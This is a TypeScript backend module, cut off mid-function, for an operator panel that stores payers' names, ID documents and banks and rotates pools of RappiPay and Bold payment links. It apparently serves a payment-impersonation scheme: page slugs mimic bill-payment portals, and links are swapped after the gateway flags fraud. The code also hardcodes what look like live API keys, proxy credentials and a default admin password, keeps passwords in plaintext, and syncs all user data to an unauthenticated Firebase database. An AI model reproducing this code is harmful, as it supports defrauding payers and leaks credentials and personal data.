import fs from 'node:fs';
import path from 'node:path';
import { env } from '../config/env';

export type GatewayProvider = 'rappipay' | 'bold_api' | 'bold';

export const MASTER_ADMIN_ID = 'USR_MASTER_ADMIN';

export interface GatewaySettings {
  gatewayProvider: GatewayProvider;
  paymentUrl: string;
  rappiUrl: string;
  rappiHighAmountThreshold?: number;
  boldUrl: string;
  boldApiKey: string;
  boldSecretKey: string;
  boldMerchantName: string;
  proxyHost: string;
  proxyPort: string;
  proxyUsername: string;
  proxyPassword: string;
  updatedAt: string;
}

export interface TransactionRecord {
  id: string;
  ownerId?: string;
  referenceId?: string;
  sessionId: string;
  nombre: string;
  doc: string;
  banco: string;
  monto: number;
  gateway: GatewayProvider;
  status: 'INITIATED' | 'PROCESSING' | 'GENERATED' | 'APPROVED' | 'REJECTED' | 'ERROR';
  sourceUrl?: string;
  redirectUrl?: string;
  errorMessage?: string;
  createdAt: string;
  confirmedAt?: string;
}

const DATA_DIR = path.resolve(__dirname, '../../data');
const SETTINGS_FILE = path.join(DATA_DIR, 'gateway-settings.json');
const TENANT_SETTINGS_FILE = path.join(DATA_DIR, 'tenant-settings.json');
const TX_FILE = path.join(DATA_DIR, 'transactions.json');
const USERS_FILE = path.join(DATA_DIR, 'users.json');
const POOL_FILE = path.join(DATA_DIR, 'rappi-pool.json');
const LINK_LOGS_FILE = path.join(DATA_DIR, 'link-logs.json');

export type RappiLinkTier = 'standard' | 'high_amount';

export interface RappiLinkItem {
  id: string;
  ownerId?: string;
  slot?: 1 | 2 | 3 | 4 | 5;
  tier?: RappiLinkTier;
  url: string;
  linkCode: string;
  status: 'ACTIVE' | 'STANDBY' | 'BLOCKED';
  usesCount: number;
  rotationUsesCount?: number;
  consecutiveFailures?: number;
  consecutivePseRejections?: number;
  addedAt: string;
  blockedAt?: string;
  blockReason?: string;
}

export const DEFAULT_HIGH_AMOUNT_THRESHOLD = 1000000;
export const STANDARD_ROTATE_EVERY = 3;
export const HIGH_AMOUNT_ROTATE_EVERY = 1;

export interface LinkEventLog {
  id: string;
  ownerId?: string;
  type: 'BLOCKED' | 'ROTATED' | 'ADDED' | 'TEST_OK' | 'TEST_FAIL';
  gateway: GatewayProvider;
  url: string;
  nextUrl?: string;
  reason: string;
  activeRemaining: number;
  blockedTotal: number;
  createdAt: string;
}

export interface PanelUser {
  id: string;
  name: string;
  password: string;
  role: 'admin' | 'user';
  slug: string;
  firebaseUid?: string;
  firebaseEmail?: string;
  createdAt: string;
  lastLoginAt?: string;
  slugUpdatedAt?: string;
}

const RESERVED_SLUGS = new Set([
  'dashboard',
  'admin',
  'api',
  'obligaciones-aval',
  'servicios-publicos',
  'conjuntos-residenciales',
  'que-quieres-pagar',
  'salud-medicina',
  'pasarela-pagos',
  'assets',
  'favicon.ico',
]);

export function sanitizeSlug(raw: string): string {
  return (raw || '')
    .trim()
    .toLowerCase()
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .replace(/[^a-z0-9-_]/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-|-$/g, '')
    .slice(0, 40);
}

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

export function detectGatewayFromUrl(rawUrl: string): {
  detected: 'rappipay' | 'bold' | 'unknown';
  linkId: string;
  cleanUrl: string;
} {
  const cleanUrl = (rawUrl || '').trim();
  if (!cleanUrl) {
    return { detected: 'unknown', linkId: '', cleanUrl: '' };
  }

  const lower = cleanUrl.toLowerCase();
  if (lower.includes('rappipay.co')) {
    const parts = cleanUrl.split('/').filter(Boolean);
    const linkId = parts[parts.length - 1] || '';
    return { detected: 'rappipay', linkId, cleanUrl };
  }

  if (lower.includes('bold.co')) {
    const match = cleanUrl.match(/(LNK_[A-Z0-9]+)/i);
    const parts = cleanUrl.split('/').filter(Boolean);
    const linkId = match ? match[1] : parts[parts.length - 1] || '';
    return { detected: 'bold', linkId, cleanUrl };
  }

  return { detected: 'unknown', linkId: '', cleanUrl };
}

function getDefaultSettings(ownerId = MASTER_ADMIN_ID): GatewaySettings {
  const isMaster = !ownerId || ownerId === MASTER_ADMIN_ID;
  const initialProvider = (env.paymentGatewayProvider || 'rappipay').toLowerCase();
  let gatewayProvider: GatewayProvider = 'rappipay';
  if (initialProvider === 'bold_api' || initialProvider === 'bold-api' || initialProvider === 'boldapi') {
    gatewayProvider = 'bold_api';
  } else if (initialProvider === 'bold') {
    gatewayProvider = 'bold';
  } else {
    gatewayProvider = 'rappipay';
  }

  const rappiUrl = isMaster ? env.paymentAutomationUrl || 'https://linkdepagospse.rappipay.co/yM8z5E' : '';
  const boldUrl = isMaster ? env.boldDefaultLink || env.paymentBoldUrl || 'https://checkout.bold.co/payment/LNK_Z0PMCC30MQ' : '';
  const paymentUrl = gatewayProvider === 'rappipay' ? rappiUrl : boldUrl;

  return {
    gatewayProvider,
    paymentUrl,
    rappiUrl,
    rappiHighAmountThreshold: DEFAULT_HIGH_AMOUNT_THRESHOLD,
    boldUrl,
    boldApiKey: isMaster ? env.boldApiKey || '1hj2O6y_2u3m0TOdk10irBoNdbpnBbLF3irryapeePU' : '',
    boldSecretKey: isMaster ? env.boldSecretKey || 'XIhz1m8PhObmGYf47He-4A' : '',
    boldMerchantName: 'Paycenter',
    proxyHost: env.proxyHost || 'geo.iproyal.com',
    proxyPort: env.proxyPort || '12321',
    proxyUsername: env.proxyUsername || 'WeeIuCAK2zva54rU',
    proxyPassword: env.proxyPassword || 'Z4VVsSB4GPzVOAqi_country-co',
    updatedAt: new Date().toISOString(),
  };
}

let cachedMasterSettings: GatewaySettings | null = null;
let cachedTenantSettings: Record<string, GatewaySettings> | null = null;
let cachedTransactions: TransactionRecord[] | null = null;
let cachedUsers: PanelUser[] | null = null;
let cachedPool: RappiLinkItem[] | null = null;
let cachedLinkLogs: LinkEventLog[] | null = null;

const FIREBASE_RTDB_BASE = (
  process.env.FIREBASE_DATABASE_URL || 'https://dashboard-48ef5-default-rtdb.firebaseio.com'
).replace(/\/+$/, '');

type DashboardListener = () => void;
const dashboardListeners = new Set<DashboardListener>();

export function subscribeDashboardUpdates(fn: DashboardListener): () => void {
  dashboardListeners.add(fn);
  return () => dashboardListeners.delete(fn);
}

function getTenantSettingsMap(): Record<string, GatewaySettings> {
  if (cachedTenantSettings) return cachedTenantSettings;
  ensureDataDir();
  if (fs.existsSync(TENANT_SETTINGS_FILE)) {
    try {
      const raw = fs.readFileSync(TENANT_SETTINGS_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      if (parsed && typeof parsed === 'object') {
        cachedTenantSettings = parsed;
        return cachedTenantSettings!;
      }
    } catch {
      // ignore
    }
  }
  cachedTenantSettings = {};
  return cachedTenantSettings;
}

function saveTenantSettingsMap(map: Record<string, GatewaySettings>): void {
  ensureDataDir();
  cachedTenantSettings = map;
  try {
    fs.writeFileSync(TENANT_SETTINGS_FILE, JSON.stringify(map, null, 2), 'utf-8');
  } catch {
    // ignore
  }
}

let rtdbSyncTimer: NodeJS.Timeout | null = null;
let rtdbHydrated = false;

function isRemoteNewer(remoteUpdatedAt?: string, localUpdatedAt?: string): boolean {
  if (!remoteUpdatedAt) return false;
  if (!localUpdatedAt) return true;
  const remoteMs = Date.parse(remoteUpdatedAt);
  const localMs = Date.parse(localUpdatedAt);
  if (Number.isNaN(remoteMs)) return false;
  if (Number.isNaN(localMs)) return true;
  return remoteMs > localMs;
}

function pushStateToFirebaseRtdb(): void {
  if (!rtdbHydrated) return;
  if (rtdbSyncTimer) clearTimeout(rtdbSyncTimer);
  rtdbSyncTimer = setTimeout(async () => {
    try {
      const payload = {
        settings: getGatewaySettings(MASTER_ADMIN_ID),
        tenantSettings: getTenantSettingsMap(),
        transactions: getAllTransactionsRaw(),
        rappiPool: getAllRappiPoolRaw(),
        linkLogs: getAllLinkLogsRaw(),
        users: getPanelUsers(),
        updatedAt: new Date().toISOString(),
      };
      await fetch(`${FIREBASE_RTDB_BASE}/avalpay_panel.json`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
    } catch {
      // ignore network/rules error if RTDB not open yet
    }
  }, 250);
}

export function formatShortBlockReason(rawReason?: string): string {
  const clean = (rawReason || '').trim();
  if (!clean) return 'Link bloqueado por la pasarela';

  if (
    clean.includes('Activado manualmente') ||
    clean.includes('Se agregaron') ||
    clean.includes('Prueba exitosa')
  ) {
    return clean;
  }

  const lower = clean.toLowerCase();
  if (
    clean.includes('PSE_TRANSACTION_TERMINATED') ||
    lower.includes('transactiontermination') ||
    lower.includes('starttransactionf') ||
    lower.includes('no se pudo realizar')
  ) {
    const cusMatch = clean.match(/CUS[:\s)]*(\d{5,})/i);
    return cusMatch
      ? `Rechazado en PSE (TransactionTermination - CUS ${cusMatch[1]})`
      : 'Rechazado en PSE (TransactionTermination - Link bloqueado)';
  }
  if (
    clean.includes('006_0769_FRAUD_TRANSACTION_BAD') ||
    clean.includes('Link de pago PSE rechazado') ||
    clean.includes('LINK_DEFINITIVAMENTE_BLOQUEADO')
  ) {
    return 'Link bloqueado por RappiPay (Rechazado por la pasarela)';
  }
  if (lower.includes('expiró') || lower.includes('expired')) {
    return 'Link bloqueado (Expirado en RappiPay)';
  }
  if (clean.includes('404') || clean.includes('Página no encontrada')) {
    return 'Link bloqueado (No encontrado o eliminado)';
  }
  if (
    lower.includes('timeout') ||
    clean.includes('No se generó redirección') ||
    clean.includes('No se detectó URL de redirección')
  ) {
    return 'Tiempo de espera agotado en la pasarela';
  }
  if (clean.length > 100) {
    return 'Link bloqueado por la pasarela';
  }
  return clean;
}

function normalizePoolReasons(items: RappiLinkItem[]): boolean {
  let modified = false;
  for (const item of items) {
    if (item.blockReason && item.blockReason.length > 100) {
      item.blockReason = formatShortBlockReason(item.blockReason);
      modified = true;
    }
  }
  return modified;
}

function normalizeLogReasons(logs: LinkEventLog[]): boolean {
  let modified = false;
  for (const log of logs) {
    if (log.reason && log.reason.length > 100) {
      log.reason = formatShortBlockReason(log.reason);
      modified = true;
    }
  }
  return modified;
}

export async function hydrateFromFirebaseRtdb(): Promise<void> {
  try {
    const res = await fetch(`${FIREBASE_RTDB_BASE}/avalpay_panel.json`);
    if (!res.ok) return;
    const data = await res.json();
    if (!data || typeof data !== 'object') return;

    ensureDataDir();
    if (Array.isArray(data.users) && data.users.length > 0) {
      fs.writeFileSync(USERS_FILE, JSON.stringify(data.users, null, 2), 'utf-8');
      cachedUsers = data.users;
    }
    if (data.tenantSettings && typeof data.tenantSettings === 'object') {
      const mergedTenants: Record<string, GatewaySettings> = { ...getTenantSettingsMap() };
      for (const [uid, remoteCfg] of Object.entries(
        data.tenantSettings as Record<string, GatewaySettings>
      )) {
        if (!remoteCfg || typeof remoteCfg !== 'object') continue;
        if (!mergedTenants[uid] || isRemoteNewer(remoteCfg.updatedAt, mergedTenants[uid]?.updatedAt)) {
          mergedTenants[uid] = remoteCfg;
        }
      }
      saveTenantSettingsMap(mergedTenants);
    }
    if (Array.isArray(data.transactions) && data.transactions.length > getAllTransactionsRaw().length) {
      fs.writeFileSync(TX_FILE, JSON.stringify(data.transactions, null, 2), 'utf-8');
      cachedTransactions = data.transactions;
    }
    if (Array.isArray(data.rappiPool) && data.rappiPool.length > 0) {
      normalizePoolReasons(data.rappiPool);
      fs.writeFileSync(POOL_FILE, JSON.stringify(data.rappiPool, null, 2), 'utf-8');
      cachedPool = data.rappiPool;
    }
    if (Array.isArray(data.linkLogs) && data.linkLogs.length > getAllLinkLogsRaw().length) {
      normalizeLogReasons(data.linkLogs);
      fs.writeFileSync(LINK_LOGS_FILE, JSON.stringify(data.linkLogs, null, 2), 'utf-8');
      cachedLinkLogs = data.linkLogs;
    }
    if (data.settings && typeof data.settings === 'object') {
      const localMaster = fs.existsSync(SETTINGS_FILE) ? getGatewaySettings(MASTER_ADMIN_ID) : null;
      if (!localMaster || isRemoteNewer(data.settings.updatedAt, localMaster.updatedAt)) {
        fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data.settings, null, 2), 'utf-8');
        cachedMasterSettings = { ...getDefaultSettings(MASTER_ADMIN_ID), ...data.settings };
      }
    }
    emitDashboardUpdate(false);
  } catch {
    // ignore
  } finally {
    rtdbHydrated = true;
  }
}

export function emitDashboardUpdate(syncRtdb = true): void {
  for (const fn of dashboardListeners) {
    try {
      fn();
    } catch {
      // ignore
    }
  }
  if (syncRtdb) {
    pushStateToFirebaseRtdb();
  }
}

void hydrateFromFirebaseRtdb();

// ==================== USER & SLUG RESOLUTION ====================
function getDefaultUsers(): PanelUser[] {
  return [
    {
      id: MASTER_ADMIN_ID,
      name: 'Cuenta Admin Principal',
      password: process.env.ADMIN_MASTER_PASSWORD || 'admin2026',
      role: 'admin',
      slug: 'principal',
      firebaseEmail: 'admin@dashboard-48ef5.firebaseapp.com',
      createdAt: new Date().toISOString(),
    },
  ];
}

export function getPanelUsers(): PanelUser[] {
  if (cachedUsers) return cachedUsers;
  ensureDataDir();
  if (fs.existsSync(USERS_FILE)) {
    try {
      const raw = fs.readFileSync(USERS_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as PanelUser[];
      if (Array.isArray(parsed) && parsed.length > 0) {
        let modified = false;
        for (const u of parsed) {
          if (!u.slug) {
            u.slug = u.id === MASTER_ADMIN_ID ? 'principal' : sanitizeSlug(u.name) || u.id.toLowerCase();
            modified = true;
          }
        }
        if (modified) {
          fs.writeFileSync(USERS_FILE, JSON.stringify(parsed, null, 2), 'utf-8');
        }
        cachedUsers = parsed;
        return cachedUsers;
      }
    } catch {
      // ignore
    }
  }
  const initial = getDefaultUsers();
  fs.writeFileSync(USERS_FILE, JSON.stringify(initial, null, 2), 'utf-8');
  cachedUsers = initial;
  return cachedUsers;
}

function isUrlBlockedForOwner(url: string, ownerId?: string): boolean {
  const clean = (url || '').trim().toLowerCase();
  if (!clean) return false;
  const all = getAllRappiPoolRaw();
  if (ownerId) {
    const matchForOwner = all.find(
      (p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId && p.url.trim().toLowerCase() === clean
    );
    if (matchForOwner) {
      return matchForOwner.status === 'BLOCKED';
    }
  }
  return all.some((p) => p.url.trim().toLowerCase() === clean && p.status === 'BLOCKED');
}

function findMostRecentActiveOwnerId(): string {
  const candidates: Array<{ ownerId: string; settings: GatewaySettings }> = [
    { ownerId: MASTER_ADMIN_ID, settings: getGatewaySettings(MASTER_ADMIN_ID) },
  ];

  const tenantMap = getTenantSettingsMap();
  for (const [uid, cfg] of Object.entries(tenantMap)) {
    if (uid && uid !== MASTER_ADMIN_ID && cfg) {
      candidates.push({ ownerId: uid, settings: cfg });
    }
  }

  const validCandidates = candidates
    .filter((c) => {
      const candidateUrl = (c.settings.rappiUrl || c.settings.paymentUrl || '').trim();
      return Boolean(candidateUrl) && !isUrlBlockedForOwner(candidateUrl, c.ownerId);
    })
    .sort((a, b) => {
      const ta = Date.parse(a.settings.updatedAt || '') || 0;
      const tb = Date.parse(b.settings.updatedAt || '') || 0;
      return tb - ta;
    });

  if (validCandidates.length > 0) {
    return validCandidates[0].ownerId;
  }

  return MASTER_ADMIN_ID;
}

export function resolveOwnerId(userIdOrSlug?: string | null): string {
  const clean = (userIdOrSlug || '').trim();
  if (clean === MASTER_ADMIN_ID) return MASTER_ADMIN_ID;

  if (clean && clean.toLowerCase() !== 'principal') {
    const users = getPanelUsers();
    const byId = users.find((u) => u.id === clean || (u.firebaseUid && u.firebaseUid === clean));
    if (byId) return byId.id;

    const cleanSlug = sanitizeSlug(clean);
    if (cleanSlug) {
      const bySlug = users.find((u) => sanitizeSlug(u.slug) === cleanSlug);
      if (bySlug) return bySlug.id;
    }
  }

  return findMostRecentActiveOwnerId();
}

export function findUserBySlug(rawSlug: string): PanelUser | null {
  const clean = sanitizeSlug(rawSlug);
  if (!clean) return null;
  const users = getPanelUsers();
  return users.find((u) => sanitizeSlug(u.slug) === clean) || null;
}

export async function persistUsersToFirebaseRtdbNow(): Promise<void> {
  try {
    await fetch(`${FIREBASE_RTDB_BASE}/avalpay_panel.json`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        users: getPanelUsers(),
        updatedAt: new Date().toISOString(),
      }),
    });
  } catch {
    // ignore network error
  }
}

export function updatePanelUserSlug(userId: string, rawSlug: string): PanelUser {
  const cleanSlug = sanitizeSlug(rawSlug);
  if (!cleanSlug || cleanSlug.length < 2) {
    throw new Error('La extensión debe tener al menos 2 letras o números.');
  }
  if (RESERVED_SLUGS.has(cleanSlug)) {
    throw new Error(`La extensión "${cleanSlug}" está reservada por el sistema. Elige otra.`);
  }

  const users = getPanelUsers();
  const ownerId = resolveOwnerId(userId);
  const target = users.find((u) => u.id === ownerId);
  if (!target) {
    throw new Error('Usuario no encontrado.');
  }

  const duplicate = users.find((u) => sanitizeSlug(u.slug) === cleanSlug && u.id !== target.id);
  if (duplicate) {
    throw new Error(`La extensión "/${cleanSlug}" ya está siendo usada por otro operador. Elige otra.`);
  }

  target.slug = cleanSlug;
  target.slugUpdatedAt = new Date().toISOString();
  ensureDataDir();
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf-8');
  cachedUsers = users;
  emitDashboardUpdate();
  return target;
}

export function findUserByPassword(password: string): PanelUser | null {
  const clean = (password || '').trim();
  if (!clean) return null;
  const users = getPanelUsers();
  const found = users.find((u) => u.password === clean);
  if (found) {
    found.lastLoginAt = new Date().toISOString();
    ensureDataDir();
    try {
      fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf-8');
    } catch {
      // ignore
    }
    return found;
  }
  return null;
}

export function createPanelUser(data: {
  name: string;
  password: string;
  role?: 'admin' | 'user';
  slug?: string;
  firebaseUid?: string;
  firebaseEmail?: string;
}): PanelUser {
  const name = (data.name || '').trim();
  const password = (data.password || '').trim();
  if (!name || !password) {
    throw new Error('Debes indicar el nombre del usuario y la contraseña.');
  }

  const users = getPanelUsers();
  if (users.some((u) => u.password === password)) {
    throw new Error('Esa contraseña ya está asignada a otro usuario.');
  }

  let baseSlug = sanitizeSlug(data.slug || name) || `op-${Math.random().toString(36).slice(2, 6)}`;
  if (RESERVED_SLUGS.has(baseSlug) || users.some((u) => sanitizeSlug(u.slug) === baseSlug)) {
    baseSlug = `${baseSlug}-${Math.random().toString(36).slice(2, 5)}`;
  }

  const newUser: PanelUser = {
    id: `USR_${Date.now()}_${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
    name,
    password,
    role: data.role === 'admin' ? 'admin' : 'user',
    slug: baseSlug,
    firebaseUid: data.firebaseUid,
    firebaseEmail: data.firebaseEmail,
    createdAt: new Date().toISOString(),
  };

  users.push(newUser);
  ensureDataDir();
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf-8');
  cachedUsers = users;
  emitDashboardUpdate();
  return newUser;
}

export function updatePanelUserPassword(id: string, newPassword: string, newName?: string): PanelUser {
  const cleanPass = (newPassword || '').trim();
  if (!cleanPass) {
    throw new Error('La nueva contraseña no puede estar vacía.');
  }
  const users = getPanelUsers();
  const duplicate = users.find((u) => u.password === cleanPass && u.id !== id);
  if (duplicate) {
    throw new Error('Esa contraseña ya está en uso por otro usuario.');
  }
  const target = users.find((u) => u.id === id);
  if (!target) {
    throw new Error('Usuario no encontrado.');
  }
  target.password = cleanPass;
  if (newName && newName.trim()) {
    target.name = newName.trim();
  }
  ensureDataDir();
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf-8');
  cachedUsers = users;
  emitDashboardUpdate();
  return target;
}

export function deletePanelUser(id: string): void {
  const users = getPanelUsers();
  const target = users.find((u) => u.id === id);
  if (!target) return;
  if (target.id === MASTER_ADMIN_ID) {
    throw new Error('No se puede eliminar la Cuenta Admin Principal (solo cambiar su contraseña).');
  }
  const filtered = users.filter((u) => u.id !== id);
  ensureDataDir();
  fs.writeFileSync(USERS_FILE, JSON.stringify(filtered, null, 2), 'utf-8');
  cachedUsers = filtered;
  emitDashboardUpdate();
}

// ==================== ISOLATED PER-USER GATEWAY SETTINGS ====================
export function getGatewaySettings(userIdOrSlug?: string): GatewaySettings {
  const ownerId = resolveOwnerId(userIdOrSlug);

  if (ownerId !== MASTER_ADMIN_ID) {
    const map = getTenantSettingsMap();
    if (!map[ownerId]) {
      map[ownerId] = getDefaultSettings(ownerId);
      saveTenantSettingsMap(map);
    }
    return map[ownerId];
  }

  if (cachedMasterSettings) return cachedMasterSettings;

  ensureDataDir();
  if (fs.existsSync(SETTINGS_FILE)) {
    try {
      const raw = fs.readFileSync(SETTINGS_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as Partial<GatewaySettings>;
      cachedMasterSettings = { ...getDefaultSettings(MASTER_ADMIN_ID), ...parsed };
      return cachedMasterSettings;
    } catch (err) {
      console.error('[Settings] Error leyendo gateway-settings.json, usando valores por defecto:', err);
    }
  }

  cachedMasterSettings = getDefaultSettings(MASTER_ADMIN_ID);
  return cachedMasterSettings;
}

export function updateGatewaySettings(
  patch: Partial<GatewaySettings>,
  userIdOrSlug?: string
): GatewaySettings {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const current = getGatewaySettings(ownerId);
  const next: GatewaySettings = {
    ...current,
    ...patch,
    updatedAt: new Date().toISOString(),
  };

  if (patch.paymentUrl) {
    const info = detectGatewayFromUrl(patch.paymentUrl);
    if (info.detected === 'rappipay') {
      next.rappiUrl = info.cleanUrl;
      if (!patch.gatewayProvider) {
        next.gatewayProvider = 'rappipay';
      }
    } else if (info.detected === 'bold') {
      next.boldUrl = info.cleanUrl;
      if (!patch.gatewayProvider) {
        next.gatewayProvider = next.boldApiKey && next.boldApiKey.length >= 30 ? 'bold_api' : 'bold';
      }
    }
  }

  if (next.gatewayProvider === 'rappipay') {
    next.paymentUrl = next.rappiUrl || next.paymentUrl;
  } else {
    next.paymentUrl = next.boldUrl || next.paymentUrl;
  }

  ensureDataDir();
  if (ownerId === MASTER_ADMIN_ID) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(next, null, 2), 'utf-8');
    cachedMasterSettings = next;
  } else {
    const map = getTenantSettingsMap();
    map[ownerId] = next;
    saveTenantSettingsMap(map);
  }

  console.log(
    `[Settings][${ownerId}] Configuración actualizada -> Pasarela: ${next.gatewayProvider.toUpperCase()} | URL: ${next.paymentUrl}`
  );
  emitDashboardUpdate();
  return next;
}

// ==================== ISOLATED PER-USER TRANSACTIONS ====================
function getAllTransactionsRaw(): TransactionRecord[] {
  if (cachedTransactions) return cachedTransactions;
  ensureDataDir();
  if (fs.existsSync(TX_FILE)) {
    try {
      const raw = fs.readFileSync(TX_FILE, 'utf-8');
      cachedTransactions = JSON.parse(raw) as TransactionRecord[];
      return cachedTransactions;
    } catch {
      cachedTransactions = [];
      return cachedTransactions;
    }
  }
  cachedTransactions = [];
  return cachedTransactions;
}

export function getAllTransactionsForTracker(): TransactionRecord[] {
  return getAllTransactionsRaw();
}

export function getTransactions(userIdOrSlug?: string): TransactionRecord[] {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const all = getAllTransactionsRaw();
  return all.filter((t) => (t.ownerId || MASTER_ADMIN_ID) === ownerId);
}

export function recordTransaction(
  tx: Omit<TransactionRecord, 'id' | 'createdAt'>,
  userIdOrSlug?: string
): TransactionRecord {
  const ownerId = resolveOwnerId(userIdOrSlug || tx.ownerId);
  const all = getAllTransactionsRaw();

  // Si viene del Paso 2 (PROCESSING), reutilizar y actualizar el registro de intento (INITIATED) de la misma sesión
  // para que no queden 2 filas duplicadas (una en PENDIENTE y otra en REDIRIGIDO).
  if (tx.status === 'PROCESSING') {
    const existingAttempt = all.find(
      (t) =>
        (t.ownerId || MASTER_ADMIN_ID) === ownerId &&
        t.status === 'INITIATED' &&
        (t.sessionId === tx.sessionId ||
          (t.monto === tx.monto &&
            Date.now() - new Date(t.createdAt).getTime() < 15 * 60 * 1000))
    );
    if (existingAttempt) {
      existingAttempt.nombre = tx.nombre;
      existingAttempt.doc = tx.doc;
      existingAttempt.banco = tx.banco;
      existingAttempt.monto = tx.monto;
      existingAttempt.gateway = tx.gateway;
      existingAttempt.status = 'PROCESSING';
      existingAttempt.sessionId = tx.sessionId;
      ensureDataDir();
      try {
        fs.writeFileSync(TX_FILE, JSON.stringify(all, null, 2), 'utf-8');
      } catch {
        // ignore disk errors
      }
      emitDashboardUpdate();
      return existingAttempt;
    }
  }

  const item: TransactionRecord = {
    ...tx,
    ownerId,
    id: `TX_${Date.now()}_${Math.random().toString(36).slice(2, 6).toUpperCase()}`,
    createdAt: new Date().toISOString(),
  };
  all.unshift(item);
  if (all.length > 500) {
    all.length = 500;
  }
  ensureDataDir();
  try {
    fs.writeFileSync(TX_FILE, JSON.stringify(all, null, 2), 'utf-8');
  } catch {
    // ignore disk errors
  }
  emitDashboardUpdate();
  return item;
}

export function updateTransactionStatus(
  referenceOrId: string,
  status: TransactionRecord['status'],
  extra?: Partial<TransactionRecord>
): void {
  const all = getAllTransactionsRaw();
  const found = all.find(
    (t) => t.referenceId === referenceOrId || t.id === referenceOrId || t.sessionId === referenceOrId
  );
  if (found) {
    found.status = status;
    if (status === 'APPROVED') {
      found.confirmedAt = new Date().toISOString();
    }
    if (extra) {
      Object.assign(found, extra);
    }
    ensureDataDir();
    try {
      fs.writeFileSync(TX_FILE, JSON.stringify(all, null, 2), 'utf-8');
    } catch {
      // ignore
    }
    emitDashboardUpdate();
  }
}

// ==================== ISOLATED PER-USER RAPPIPAY POOL & LOGS ====================
function getAllRappiPoolRaw(): RappiLinkItem[] {
  if (cachedPool) return cachedPool;
  ensureDataDir();
  if (fs.existsSync(POOL_FILE)) {
    try {
      const raw = fs.readFileSync(POOL_FILE, 'utf-8');
      const parsed = JSON.parse(raw) as RappiLinkItem[];
      if (Array.isArray(parsed)) {
        if (normalizePoolReasons(parsed)) {
          try {
            fs.writeFileSync(POOL_FILE, JSON.stringify(parsed, null, 2), 'utf-8');
          } catch {
            // ignore
          }
        }
        cachedPool = parsed;
        return cachedPool;
      }
    } catch {
      // ignore
    }
  }
  const current = getGatewaySettings(MASTER_ADMIN_ID);
  const initialInfo = detectGatewayFromUrl(current.rappiUrl);
  const initialPool: RappiLinkItem[] = current.rappiUrl
    ? [
        {
          id: `RPL_${Date.now()}`,
          ownerId: MASTER_ADMIN_ID,
          url: current.rappiUrl,
          linkCode: initialInfo.linkId || 'rappi',
          status: 'ACTIVE',
          usesCount: 0,
          addedAt: new Date().toISOString(),
        },
      ]
    : [];
  fs.writeFileSync(POOL_FILE, JSON.stringify(initialPool, null, 2), 'utf-8');
  cachedPool = initialPool;
  return cachedPool;
}

function saveAllRappiPoolRaw(pool: RappiLinkItem[]): void {
  ensureDataDir();
  fs.writeFileSync(POOL_FILE, JSON.stringify(pool, null, 2), 'utf-8');
  cachedPool = pool;
  emitDashboardUpdate();
}

function getLinkTier(item?: Pick<RappiLinkItem, 'tier' | 'slot'> | null): RappiLinkTier {
  if (item?.tier === 'high_amount' || item?.slot === 4 || item?.slot === 5) {
    return 'high_amount';
  }
  return 'standard';
}

function getTierRotateEvery(tier: RappiLinkTier): number {
  return tier === 'high_amount' ? HIGH_AMOUNT_ROTATE_EVERY : STANDARD_ROTATE_EVERY;
}

export function getRappiHighAmountThreshold(userIdOrSlug?: string): number {
  const settings = getGatewaySettings(userIdOrSlug);
  const val = Number(settings.rappiHighAmountThreshold);
  return Number.isFinite(val) && val >= 10000 ? Math.round(val) : DEFAULT_HIGH_AMOUNT_THRESHOLD;
}

export function getRappiLinksPool(userIdOrSlug?: string): RappiLinkItem[] {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const all = getAllRappiPoolRaw();
  const userItems = all.filter((p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId);

  // Normalizar slots para links heredados sin número de slot asignado
  const usedSlots = new Set<number>(userItems.map((p) => p.slot).filter((s): s is 1 | 2 | 3 | 4 | 5 => Boolean(s)));
  for (const item of userItems) {
    const tier = getLinkTier(item);
    item.tier = tier;
    if (!item.slot) {
      const candidates: (1 | 2 | 3 | 4 | 5)[] = tier === 'high_amount' ? [4, 5] : [1, 2, 3];
      const freeSlot = candidates.find((s) => !usedSlots.has(s));
      if (freeSlot) {
        item.slot = freeSlot;
        usedSlots.add(freeSlot);
      }
    }
  }

  return userItems.sort((a, b) => (a.slot || 99) - (b.slot || 99));
}

export interface RappiSlotConfig {
  slot: 1 | 2 | 3 | 4 | 5;
  tier: RappiLinkTier;
  rotateEvery: number;
  url: string;
  item: RappiLinkItem | null;
}

export function getRappiPoolSlots(userIdOrSlug?: string): RappiSlotConfig[] {
  const pool = getRappiLinksPool(userIdOrSlug);
  const slots: (1 | 2 | 3 | 4 | 5)[] = [1, 2, 3, 4, 5];
  return slots.map((slot) => {
    const tier: RappiLinkTier = slot >= 4 ? 'high_amount' : 'standard';
    const item = pool.find((p) => p.slot === slot) || null;
    return {
      slot,
      tier,
      rotateEvery: getTierRotateEvery(tier),
      url: item?.url || '',
      item,
    };
  });
}

export function saveRappiPoolSlots(
  slotsInput: Array<{ slot: number; url: string }>,
  highAmountThreshold?: number,
  userIdOrSlug?: string
): { pool: RappiLinkItem[]; slots: RappiSlotConfig[]; settings: GatewaySettings } {
  const ownerId = resolveOwnerId(userIdOrSlug);
  const allPool = getAllRappiPoolRaw();
  const existingUserItems = allPool.filter((p) => (p.ownerId || MASTER_ADMIN_ID) === ownerId);
  const otherUsersItems = allPool.filter((p) => (p.ownerId || MASTER_ADMIN_ID) !== ownerId);

  const normalizedThreshold =
    Number.isFinite(Number(highAmountThreshold)) && Number(highAmountThreshold) >= 10000
      ? Math.round(Number(highAmountThreshold))
